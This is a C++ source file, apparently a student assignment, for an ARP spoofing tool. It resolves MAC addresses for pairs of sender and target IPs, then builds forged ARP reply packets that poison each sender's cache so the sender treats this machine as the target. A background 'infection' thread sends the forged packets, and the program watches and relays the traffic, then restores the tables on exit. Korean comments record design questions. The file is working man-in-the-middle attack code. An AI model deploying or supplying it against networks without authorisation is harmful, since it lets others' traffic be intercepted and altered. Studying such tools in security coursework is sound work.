#include "send-arp.h"

int main(int argc, char* argv[]) {
	void (*signal_hand)(int);
	signal_hand = signal(SIGINT, sigint_handler);

	// 입력 인자 개수가 4개 이상이어야 하며 짝수여야함.
	if (argc < 4 || argc % 2 != 0) {
		usage();
		return -1;
	}


	char* dev = argv[1];	
	
	std::map<Ip, Mac> ARPtable;
	if(getMyInfo(dev, ARPtable) == FAIL) return -1;
	
	Ip me = getMyIp(dev);
	if ((int)me == FAIL) return -1;
	
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}


	// 전처리를 하자 
	// resolve를 미리 다 해놓자
	std::vector <pair<Ip, Ip>> IpTable; // {sender, target}
	Ip sender, target;
	int now = 2;
	while(now < argc) {
		initArg(&argv[now], sender, target);

		// 사용자가 입력을 이상하게 했을 경우?? 고려해야하나?
		// 동일한 {sender, target} 쌍이 들어온다면?
		// vector에서 O(n)으로 서치하자.
		int dup_flag = 0;
		for(auto i : IpTable) {
			if(i.first == sender && i.second == target) {
				dup_flag = 1;
				#ifdef DEBUG
				cout << "dup find" << endl;
				#endif
				now = now + 2;
				break;
			}
		}

		if(dup_flag) continue;

		IpTable.push_back({sender, target});

		if(resolveMac(handle, ARPtable, me, sender) == FAIL) return -1;
		if(resolveMac(handle, ARPtable, me, target) == FAIL) return -1;

		now = now + 2;
	}
	#ifdef DEBUG
	for(auto i = ARPtable.begin(); i != ARPtable.end(); i++) {
		cout << string(i->first) << ' ' << uint32_t(i->first) << ' ' << string(i->second) << endl;
	}
	for(auto i = IpTable.begin(); i != IpTable.end(); i++) {
		cout << string(i->first) << ' '  << string(i->second) << endl;
	}
	cout << "infection start" << endl;
	#endif



	// infection 실행
	for(auto i : IpTable) {
		infectionPacket.push_back(fillPacket(ARPtable[me], ARPtable[i.first], ARPtable[me], i.second, ARPtable[i.first], i.first, ArpHdr::Reply));
	}
	pthread_t t;
	Pthread_create(&t, NULL, infection, (void*)handle); // assert

	watchPacket(handle, ARPtable, IpTable, me); 
	
	cout << "infection end" << endl;
	pthread_cancel(t);
	Pthread_join(t, NULL);
	cout << "recover start" << endl;

	for(auto i : IpTable) {
		recover(handle, ARPtable, i.first, i.second);
	}

	cout << "exit" << endl;
	// handle이 먼저 종료되면 기존에 handle로 처리한더거 처리 못함
	pcap_close(handle);
	return 0;
}
